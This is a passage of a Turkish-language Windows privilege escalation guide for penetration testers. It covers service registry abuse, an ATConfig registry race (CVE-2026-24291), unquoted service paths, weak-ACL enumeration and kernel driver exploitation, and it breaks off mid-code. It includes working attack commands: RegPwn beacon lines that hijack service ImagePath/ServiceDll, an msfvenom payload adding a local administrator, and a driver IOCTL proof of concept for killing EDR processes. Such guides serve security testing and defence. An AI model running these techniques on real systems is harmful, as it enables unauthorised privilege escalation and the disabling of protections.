> Hizmet normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, açılışta otomatik olarak başlayıp başlamadığını, yeniden başlatan bir failure action olup olmadığını veya hizmeti kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemediğini kontrol edin.

### Services registry modify permissions

Herhangi bir hizmet registry’sini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **registry**’si üzerindeki **izinlerinizi** şu şekilde **kontrol** edebilirsiniz:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Belirli bir hizmet anahtarında **Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** gruplarının yazma yetkisi sağlayan kayıt defteri izinlerine sahip olup olmadığını inceleyin. Tek başına bir ACL girdisi, etkin erişimi kanıtlamaz: reddetme girdileri, geçerli token ve devralınan izinler önemlidir. Kayıt defteri anahtarı izinleri, hizmet nesnesinin `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` izinlerinden ayrıdır. Yükseltme için ayrıca kullanılabilir bir hizmet yapılandırma alanı, hizmeti tetikleme yöntemi ve daha ayrıcalıklı bir hizmet kimliği gerekir. Microsoft’un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sayfalarına bakın.

Çalıştırılan binary’nin yolunu değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race ile rastgele HKLM değer yazma (ATConfig)

Bazı Windows Erişilebilirlik özellikleri, daha sonra bir **SYSTEM** süreci tarafından HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Registry **symbolic link race**, bu ayrıcalıklı yazma işlemini **herhangi bir HKLM yoluna** yönlendirerek rastgele HKLM **değer yazma** olanağı sağlar.<sup>[[18]](#references)</sup>

Anahtar konumları (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı tarafından denetlenebilen yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, oturum açma/güvenli masaüstü geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** değerini ayarlayın.
2. AT broker akışını başlatan güvenli masaüstü kopyalama işlemini tetikleyin (ör. **LockWorkstation**).
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine **oplock** koyarak **race'i kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını, korumalı bir HKLM hedefine işaret eden bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilen HKLM yoluna yazar.

Rastgele HKLM değer yazma olanağı elde ettikten sonra, hizmet yapılandırma değerlerinin üzerine yazarak LPE'ye geçiş yapın:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabildiği bir hizmet seçin (ör. **`msiserver`**) ve yazma işleminden sonra hizmeti tetikleyin. **Not:** genel exploit uygulaması, race'in bir parçası olarak iş istasyonunu **kilitler**.

Örnek araçlar (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz, **bu registry altında alt registry'ler oluşturabilirsiniz**. Windows services söz konusu olduğunda bu, **keyfi kod çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable'ın yolu tırnak işaretleri içinde değilse, Windows boşluktan önce biten her olası yolu çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmayı dener:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanlar hariç tüm unquoted service path'leri listeleyin:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu güvenlik açığını tespit edip istismar edebilirsiniz**: `exploit/windows/local/trusted\_service\_path` You can manually create a service binary with metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, kullanıcıların bir hizmet başarısız olduğunda gerçekleştirilecek eylemleri belirtmesine olanak tanır. Bu özellik, bir binary'yi işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla bilgi için [resmî belgelere](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bakın.

## Zamanlanmış görev script hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görev için, `cmd.exe`'nin yanı sıra **action arguments** içinde belirtilen script'i de kontrol edin. Aynısı, PowerShell `-File` gibi bir yorumlayıcının açık dosya argümanı için de geçerlidir. Zamanlanmış bir batch dosyası doğrudan bir PowerShell `-File` çağrısı içeriyorsa, belirtilen script'in ACL'sini de inceleyin; değişkenler, koşullu ifadeler ve shell zincirleme işlemleri elle izlenmelidir. Çağıran hesabın yazabildiği bir script veya üst dizin, yalnızca yapılandırılmış görev principal'ı çağıran hesaptan farklıysa ve görev gerçekten o eyleme ulaşıyorsa hesaplar arası yürütme için bir ipucudur. Script'ler için yalnızca sona eklemeye izin veren bir ACL önemli olabilir; ancak daha önceki bir `exit` veya başka bir kontrol akışı, eklenen satırların erişilemez olmasına neden olabilir. Privilege escalation iddiasında bulunmadan önce etkin ACL'leri, [görev yürütme bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi ilkesini doğrulayın. Envanter çıkarma işlemi script'i değiştirmemeli veya görevi başlatmamalıdır.

## Erişilebilir dosyalardaki adlandırılmış akışlar

NTFS'te okunabilir bir dosyanın, sıradan bir dizin listelemesinde gösterilmeyen içeriğe sahip adlandırılmış bir `:$DATA` akışı olabilir. Erişilebilir yedekleme veya yapılandırma dosyalarından oluşan küçük ve ilgili bir küme için, herhangi bir içeriği açmadan önce akış **adlarını ve boyutlarını** inceleyin; Windows bunlara [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) ve PowerShell'in [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) komutuyla erişim sağlar. Gizli bir bilgiye işaret eden akış adı yalnızca bir ipucudur. Dosyanın etkin okuma erişimini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu kimlik bilgilerinin gerçekte hangi hesapla kimlik doğruladığını kontrol edin. Rutin envanter çıkarma sırasında özyinelemeli akış taramalarından ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı programı girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizindeki `command.txt`, `reboot.rsf` ve proje `working\rsf.rsf` dosyasını kullanabilen `StandaloneRunner.exe` içerir. Bu yardımcı programı ayrıcalıklı bir hesapla başlatan zamanlanmış bir görev veya hizmet, yardımcı programın kendisi korumalı olsa bile bu girdilere düşük ayrıcalıklı yazma erişimini söz konusu hesabın bağlamında komut yürütmeye dönüştürebilir. Ayrıcalıklı tüketiciyi ve **her iki** ek dosyanın da oluşturulabildiğini veya değiştirilebildiğini doğrulayın; yalnızca yardımcı programı bulmak yeterli değildir.

Zamanlanmış bir görev için, eylemin [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) değerini ve iki ek dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, yürütülebilir dosyanın dizini, doğrulanması gereken bir ipucudur; görevin girdilerini nereden okuduğunun kanıtı değildir. Proje çalışma dosyasına ilişkin ön koşul da karşılanmalıdır. Görevin SYSTEM olarak çalıştığını varsaymak yerine gerçek görev principal'ını kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**Binary'lerin izinlerini** (birini üzerine yazıp privilege escalation sağlayabilirsiniz) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)) kontrol edin.

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent onarım yolu

[CVE-2024-0670](https://checkmk.com/werk/16361), `C:\Windows\Temp` konumuna komut dosyaları yazan ve değiştirme başarısız olduğunda önceden var olan, yazmaya karşı korumalı bir dosyayı çalıştıran eski Checkmk Windows agent sürümlerini etkiler. Üretici sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde düzeltti. Yüklü tam yama düzeyini ve etkilenen agent işleminin çalışıp çalışamayacağını kontrol edin; `2.1` gibi yalnızca dalı belirten bir etiket, sistemin etkilenebilir olduğunu göstermez. Envanter çıkarma işlemi; dosya oluşturmadan veya agent komutlarını tetiklemeden sürümü, hizmet durumunu ve Temp izinlerini inceleyebilir.

#### ADSelfService Plus SAML hizmeti incelemesi

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), ADSelfService Plus build 6210 ve önceki sürümleri etkiledi; üretici sorunu build 6211'de düzeltti. Bu sorun yalnızca SAML SSO **etkinse veya geçmişte etkin olmuşsa** önem taşır. Bu nedenle, yüklü ürün kaydı veya hizmet yolu bir ipucudur, güvenlik açığı kararı değildir: kesin build numarasını, SAML yapılandırma geçmişini, hizmetin ağdan erişilebilirliğini ve çalıştığı hesabı doğrulayın. Hizmet üzerinden code execution, o hesabın ayrıcalıklarını devralır; SYSTEM olarak çalıştırma için örneğin SYSTEM hesabıyla çalışan bir hizmet gerekir. Ürünün Backup dizininde okunabilir bir `OfflineBackup_*.ezip` bulunması, ayrı ve şifrelenmiş bir yedekleme ipucudur; kullanılabilir kimlik bilgilerinin veya bu SAML açığının kanıtı değildir. Rutin envanter çıkarma sırasında dosyayı açmadan yolunu ve erişim haklarını kaydedin.

#### Jenkins controller ve etki alanı hesabı sınırları

Windows Jenkins controller'da iş oluşturma veya yapılandırma iznini işi başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` izinleri olarak belgeliyor](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzak tetikleyici başka bir build yolu sağlayabilir; ancak bunun etkin olduğunu ve build'in gerçekten çalıştığını doğrulayın. Çalıştırma, controller'ın veya seçilen agent'ın kimliğiyle yapılır; kayıtlı bir kimlik bilgisi yalnızca işin erişebildiği kapsamda kullanılabilir. Ayrıca `JENKINS_HOME` meta verilerine erişimi inceleyin: Jenkins, kimlik bilgisi malzemelerini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` konumlarında tutar ([Jenkins gizli bilgi depolama](https://www.jenkins.io/doc/developer/security/secrets/)). Bunların varlığı tek başına bir parolayı açığa çıkarmaz; paylaşılan çıktılarda gizli bilgileri yazdırmadan **gerekli dosyalara okuma erişimini** ve ayrı bir hesap yeniden kullanımı yolunu doğrulayın. Bu hesabın bir AD kullanıcı nesnesinin `scriptPath` alanına yazma hakkı varsa, bunu kullanıcılar arası çalıştırma olarak değerlendirmeden önce yazılabilir bir komut dosyası yolunu ve hedef kullanıcı olarak çalışan gerçek bir oturum açma veya zamanlanmış görevi doğrulayın. Daha fazla grup denetimi için etkin AD haklarını ayrıca doğrulamak gerekir.

#### Azure Pipelines self-hosted agent kimliği

Azure DevOps Server veya Azure Pipelines projesinde, bir pipeline **oluşturma veya düzenleme** iznini onu **kuyruğa alma** ve seçili agent pool'u kullanma izninden ayrı değerlendirin; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [pool yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) ayrı ayrı belgeliyor. Daha düşük ayrıcalıklı bir hesap bir script step gönderebiliyor ve bu pipeline'ı self-hosted Windows agent üzerinde çalıştırabiliyorsa, step [agent'ın yapılandırılmış işletim sistemi hesabı](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) olarak çalışır. Kullanıcılar arası veya SYSTEM geçişi olduğunu öne sürmeden önce ilgili pipeline'ı, branch/resource kısıtlamalarını, yetkilendirilmiş pool'u, çalıştırılabilir işi ve agent hizmet kimliğini doğrulayın. Yüklü bir agent, proje rolü veya depoya yazma izni tek başına yalnızca bir ipucudur; pasif envanter çıkarma sırasında build başlatmadan izinleri ve yerel hizmet meta verilerini inceleyin.

#### Microsoft Entra Connect Sync kimlik bilgileri

[Microsoft,](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) eşitleme hizmetini çalıştıran ve SQL veritabanına erişen **ADSync hizmet hesabını**, dizin izinleri yapılandırılan eşitleme özelliklerine bağlı olan **AD DS connector hesabından** ayırır. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır; anahtar malzemesi [ADSync hizmet hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Yüklü bir eşitleme hizmeti, yerel yönetici izlenimi veren bir grup veya yalnızca veritabanının görünür olması, çözülebilir bir kimlik bilgisini ya da etki alanı ayrıcalık yükseltmesini kanıtlamaz. Gerçek veritabanı okuma haklarını, hizmet hesabı ve anahtar erişimini, kurulum ve SQL düzenini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin envanter çıkarma yalnızca hizmet ve erişim meta verilerini göstermeli; kayıtlı gizli bilgileri sorgulamamalı veya yazdırmamalıdır.

#### Yazıcı sürücüsü destek DLL izinleri

Yüklü bir yazıcı sürücüsü, destek DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir yazdırma işleminde yükleyebilir. Yazıcı WMI envanterine erişim reddedilse bile, üst dizinler ve reparse point'ler dahil olmak üzere ilgili sürücü dizininin ve DLL'lerin ACL'lerini inceleyin. [Ricoh yazıcı sürücüsü sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` idi; [ilk açıklama](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) DLL'lerin `PrintIsolationHost.exe` tarafından yüklendiğini belirtiyor. Yazılabilir bir ACL yalnızca bir ipucudur: deny girdileri uygulandıktan sonraki etkin yazma erişimini, ilgili sürücünün yüklü olduğunu ve dosyayı ayrıcalıklı bir kimlikle yüklediğini ve üreticinin güncel sürücüsünün veya güvenlik programının kurulum sorununu giderip gidermediğini doğrulayın. Yalnızca dizin adından veya sürücü sürümünden hareketle güvenlik açığı olduğu sonucuna varmayın.

### Yazma İzinleri

Bazı özel dosyaları okuyabilmek için yapılandırma dosyalarını değiştirip değiştiremeyeceğinizi veya bir Administrator hesabı tarafından çalıştırılacak bir binary'yi (schedtasks) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şunu çalıştırmaktır:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin otomatik yükleme kalıcılığı/yürütme

Notepad++’ın `plugins` alt klasörlerindeki tüm plugin DLL’lerini otomatik yükler. Yazılabilir bir portable/kopya kurulum varsa, kötü amaçlı bir plugin bırakmak her başlatmada `notepad++.exe` içinde otomatik kod yürütülmesini sağlar (`DllMain` ve plugin callback’leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Başka bir kullanıcı tarafından yürütülecek bir kayıt defteri girdisinin veya ikilinin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Ayrıcalıkları yükseltmek için ilgi çekici autoruns konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı** **okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf, şüpheli/güvenlik açığı bulunan** sürücüleri arayın

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver, keyfi kernel read/write primitive sunuyorsa (kötü tasarlanmış IOCTL handler'larında sık görülür), kernel memory'den doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Vulnerable çağrının saldırganın denetimindeki bir Object Manager yolunu açtığı race-condition bug'larında, lookup işlemini bilerek yavaşlatmak (maksimum uzunlukta bileşenler veya derin dizin zincirleri kullanarak) pencereyi mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool disclosure'ları ve I/O ring pivot'ları

Bazı Windows kernel LPE zincirleri, tek başlarına zayıf olan iki bug'dan oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi serbest bırakan **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool allocation'ını sızdıran **lock-release-before-copy** disclosure.<sup>[[29]](#references)</sup>

Denetim ve exploitation notları:

- **Lock altındayken serbest bırakma + sonrasında cancel**: success path'in **Acquire -> CompleteRequest/free -> Release**, cancel path'in ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Success path, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` çağrısına ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bekleyen bir thread daha sonra devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA`'yı driver'ın remove callback'ine geçirebilir.
- Serbest bırakılan queue object'ini aynı boyutta, saldırganın denetimindeki bir paged-pool allocation'ıyla **yeniden kullanın**. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve boyut denetlenebilir, ayrıca bunlar daha sonra pipe read/peek işlemleriyle incelenebilir. Serbest bırakılan object list link'leri içeriyorsa bunları **user memory'deki sahte request node'larından oluşan döngüsel bir listeyle** üzerine yazın. Böylece driver, özgün liste başında durmak yerine saldırganın tanımladığı request structure'larını tekrar tekrar işler.
- **Tahmin edilebilir bir write'ı yükseltin**: Sahte request, bookkeeping write'larda (timestamps / QPC / refcount'a bitişik alanlar) kullanılan iç içe bir context pointer'ını yönlendirirse, **adresi denetlenebilir ancak değeri denetlenemeyen** bir kernel write elde edebilirsiniz. Bu durumda, son bir code/data pointer yerine sprayed pool object'in **length/size** alanını hedefleyin; ardından bozulmuş object'in **out-of-bounds paged-pool read** sağlamasına kadar spray'i tek tek deneyin.
- **Raceable disclosure örüntüsü**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan her syscall güçlü bir adaydır. Saldırgan kopyalanan buffer'ı büyütebiliyorsa güvenilirlik artar (örneğin, serializer'ın son allocation boyutunu artıran çok sayıda list/resource entry ekleyerek). Bu, makineyi çökertmeden replacement penceresini genişletir.
- **Pointer bakımından zengin refill hedefleri**: Windows **I/O ring** registered-buffer array'leri, paged-pool boyutları saldırgan tarafından denetlenebildiği (`8 * regBufferCnt`) ve her öğe bir `_IOP_MC_BUFFER_ENTRY` kernel pointer'ı olduğu için mükemmel disclosure hedefleridir. Bu array'lerden birini leak edin, çevresindeki `IORING_OBJECT`'i bulun, ardından sonraki I/O ring işlemlerinin saldırganın oluşturduğu entry'leri kullanıp keyfi kernel read/write sağlaması için **`RegBuffers`** ve **`RegBuffersCount`** değerlerini bozun. Kullanılabilir tek write sabit bir byte sağlıyorsa (örneğin `KUSER_SHARED_DATA+0x14` üzerinden), `0x0101010101010101` gibi yinelenen byte'lardan oluşan bir user pointer oluşturmak için **hizalanmamış, örtüşen write'lar** kullanın; pointer'ı `VirtualAlloc` ile map edin ve sahte registered-buffer array'ini oraya yerleştirin.<sup>[[30]](#references)</sup>

Yararlı debugging göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Corrupted I/O ring'den arbitrary kernel read/write elde ettikten sonra, standart primitive sonrası iş akışını kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive bellek bozulması primitive'leri

Modern hive açıkları, deterministik bellek düzenleri oluşturmanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve özel bir driver olmadan metadata bozulmasını kernel paged-pool taşmalarına dönüştürmenize olanak tanır. Zincirin tamamını burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırganın kontrolündeki yollar üzerinden `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver'lar userland'den bir registry yolu kabul eder, yolun geçerli bir UTF-16 dizesi olduğunu doğrulamakla yetinir ve ardından `RTL_QUERY_REGISTRY_DIRECT` ile `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar'ına yapar. `RTL_QUERY_REGISTRY_TYPECHECK` eksikse, `EntryContext` geliştiricinin beklediği türe göre değil, registry'deki **gerçek** türe göre yorumlanır.

Bu, işe yarar iki primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcının kontrol ettiği mutlak bir `\Registry\...` yolu, driver'ın saldırganın seçtiği anahtarları sorgulamasına, dönüş kodları/loglar üzerinden anahtarların varlığını sızdırmasına ve bazen çağıranın doğrudan erişemeyeceği değerleri okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar hedef, registry değerinin türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış bir binary buffer olarak type confusion'a uğrar.

Pratik exploitation notları:

- **Windows 8+ mitigation**: Sorgu `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullanarak **untrusted hive**'a erişirse, kernel çağıranları `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile çöker. Exploitability'yi korumak için, değerleri `HKCU` altında hazırlamak yerine **trusted system hives** içindeki **saldırgan tarafından yazılabilir anahtarları** arayın.
- **Trusted-hive hazırlığı**: `\Registry\Machine` altındaki yazılabilir alt anahtarları listelemek için NtObjectManager kullanın ve sandbox'lı bağlamlardan erişilebilen anahtarları bulmak için taramayı yinelenmiş bir **low-integrity** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` değişkenine doğrudan 8-byte yazılması, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`'in bir `UNICODE_STRING`'i işaret etmesini bekler. Kod önce saldırganın kontrolündeki bir `REG_DWORD` değerini stack scalar'a yükler ve ardından aynı buffer'ı string okuması için yeniden kullanırsa, saldırgan `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkileyerek yarı kontrollü bir kernel write elde eder.
- **`REG_BINARY`**: büyük binary veriler için direct mode, `EntryContext`'teki ilk `LONG` değerini signed buffer boyutu olarak ele alır. Önceki bir `REG_DWORD` okuması, yeniden kullanılan scalar'da saldırganın kontrolündeki **negatif** bir değer bırakırsa sonraki `REG_BINARY` sorgusu, saldırganın byte'larını doğrudan bitişik stack slot'larının üzerine kopyalar. Bu, callback pointer'ının tamamının üzerine yazmak için genellikle en temiz yoldur.

Güçlü bir hunting pattern: **aynı stack variable'a yeniden başlatılmadan yapılan farklı türde registry okumaları**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'larını ve ilk registry okumasının ikinci okumanın yapılıp yapılmayacağını kontrol ettiği code path'lerini arayın.

#### Device object'lerde FILE_DEVICE_SECURE_OPEN eksikliğini kötüye kullanma (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver'lar, IoCreateDeviceSecure ile güçlü bir SDDL kullanarak device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarlamayı unutur. Bu flag olmadığında, device fazladan bir bileşen içeren bir path üzerinden açıldığında secure DACL uygulanmaz; böylece ayrıcalıksız herhangi bir kullanıcı aşağıdaki gibi bir namespace path kullanarak handle alabilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadaki bir örnekten)

Kullanıcı device'ı açabildiğinde, driver'ın sunduğu ayrıcalıklı IOCTL'ler LPE ve tampering için kötüye kullanılabilir. Gerçek ortamlarda gözlemlenen örnek yetenekler:
- Rastgele process'lere tam erişimli handle'lar döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser üzerinden SYSTEM shell).
- Sınırsız raw disk read/write (çevrimdışı tampering, boot-time persistence hileleri).
- Protected Process/Light (PP/PPL) dahil rastgele process'leri sonlandırma; kernel üzerinden user land'den AV/EDR kill işlemi yapmaya olanak tanır.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
